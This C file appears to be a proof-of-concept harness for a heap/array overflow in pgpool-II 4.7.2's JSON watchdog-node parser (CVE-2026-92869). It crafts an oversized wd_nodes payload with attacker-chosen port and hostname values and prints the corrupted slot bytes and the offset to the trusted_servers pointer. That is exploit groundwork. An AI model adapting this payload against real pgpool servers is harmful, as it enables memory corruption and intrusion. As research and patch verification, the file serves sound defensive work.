/*
 * Direct-call probe for the CVE-2026-92869 wd_nodes branch of
 * get_pool_config_from_json() (wd_json_data.c:184-203 in 4.7.2).
 *
 * The peer controls the JSON wd_nodes array length. 4.7.2 stores it in the
 * fixed 128-entry WdNodesConfig.wd_node_info array without an upper bound;
 * 4.7.3 rejects length > MAX_WATCHDOG_NUM. No daemon and no loopback socket
 * are involved: this measures the parser object alone.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <stddef.h>
#include "pool.h"
#include "pool_config.h"
#include "watchdog/wd_json_data.h"
#include "parser/pg_list.h"

/* Unused by the config-parse path; stubs satisfy unrelated object references. */
void	   *MemoryContextAlloc(MemoryContext ctx, Size n) { (void) ctx; return malloc(n); }
void	   *copyObjectImpl(const void *from) { (void) from; return NULL; }
size_t		pvsnprintf(char *buf, size_t len, const char *fmt, va_list ap)
{ return (size_t) vsnprintf(buf, len, fmt, ap); }

POOL_CONFIG *pool_config = NULL;
POOL_REQUEST_INFO *Req_info = NULL;

static char *
payload(int nodes, unsigned int chosen, const char *hostname)
{
	size_t		cap = 4096 + (size_t) nodes * 384;
	char	   *buf = malloc(cap);
	size_t		off = 0;
	int			i;

	if (!buf)
		exit(2);
	off += (size_t) snprintf(buf + off, cap - off,
		"{\"listen_backlog_multiplier\":0,\"child_life_time\":0,"
		"\"connection_life_time\":0,\"child_max_connections\":0,"
		"\"client_idle_limit\":0,\"max_pool\":0,\"num_init_children\":0,"
		"\"min_spare_children\":0,\"max_spare_children\":0,"
		"\"process_management_mode\":0,\"process_management_strategy\":0,"
		"\"replication_mode\":0,\"enable_pool_hba\":0,\"load_balance_mode\":0,"
		"\"replication_stop_on_mismatch\":0,\"allow_clear_text_frontend_auth\":0,"
		"\"failover_if_affected_tuples_mismatch\":0,\"replicate_select\":0,"
		"\"connection_cache\":0,\"health_check_timeout\":0,"
		"\"health_check_period\":0,\"health_check_max_retries\":0,"
		"\"health_check_retry_delay\":0,\"failover_on_backend_error\":0,"
		"\"recovery_timeout\":0,\"search_primary_node_timeout\":0,"
		"\"client_idle_limit_in_recovery\":0,\"insert_lock\":0,"
		"\"memory_cache_enabled\":0,\"use_watchdog\":0,"
		"\"clear_memqcache_on_escalation\":0,\"wd_priority\":0,"
		"\"pgpool_node_id\":0,\"failover_when_quorum_exists\":0,"
		"\"failover_require_consensus\":0,"
		"\"allow_multiple_failover_requests_from_node\":0,"
		"\"backend_desc\":[{\"backend_port\":5432,\"backend_hostname\":\"h\"}],"
		"\"wd_nodes\":[");
	for (i = 0; i < nodes; i++)
	{
		unsigned int pgport = (i >= MAX_WATCHDOG_NUM) ? chosen : 9999U;
		unsigned int wdport = (i >= MAX_WATCHDOG_NUM) ? chosen : 9000U;
		const char *host = (i >= MAX_WATCHDOG_NUM) ? hostname : "node0";

		off += (size_t) snprintf(buf + off, cap - off,
			"%s{\"wd_port\":%u,\"pgpool_port\":%u,\"hostname\":\"%s\"}",
			i ? "," : "", wdport, pgport, host);
	}
	off += (size_t) snprintf(buf + off, cap - off, "]}");
	return buf;
}

int main(int argc, char **argv)
{
	int			n = (argc > 1) ? atoi(argv[1]) : 129;
	unsigned int chosen = (argc > 2) ? strtoul(argv[2], NULL, 0) : 0x42424242U;
	const char *hostname = (argc > 3) ? argv[3] : "PEERHOST";
	char	   *json = payload(n, chosen, hostname);
	POOL_CONFIG *cfg;

	fprintf(stderr, "payload_len=%zu nodes=%d chosen=0x%08x hostname=%s\n",
		strlen(json), n, chosen, hostname);
	cfg = get_pool_config_from_json(json, (int) strlen(json));
	if (cfg)
	{
		const unsigned char *slot =
			(const unsigned char *) &cfg->wd_nodes.wd_node_info[MAX_WATCHDOG_NUM];
		const unsigned char *ports = slot + offsetof(WdNodeInfo, pgpool_port);
		int			i;

		fprintf(stderr, " num_wd=%d", cfg->wd_nodes.num_wd);
		fprintf(stderr, " sizeof_node=%zu pgport_off=%zu wdport_off=%zu",
			sizeof(cfg->wd_nodes.wd_node_info[0]),
			offsetof(WdNodeInfo, pgpool_port), offsetof(WdNodeInfo, wd_port));
		fprintf(stderr, " trusted_minus_slot=%td",
			(char *) &cfg->trusted_servers - (char *) slot);
		fprintf(stderr, " hostname_slot=");
		for (i = 0; i < 16; i++)
			fprintf(stderr, "%02x", slot[i]);
		fprintf(stderr, " port_slot=");
		for (i = 0; i < 8; i++)
			fprintf(stderr, "%02x", ports[i]);
		fprintf(stderr, " trusted_servers=%p", (void *) cfg->trusted_servers);
	}
	fprintf(stderr, "\n");
	free(json);
	return 0;
}
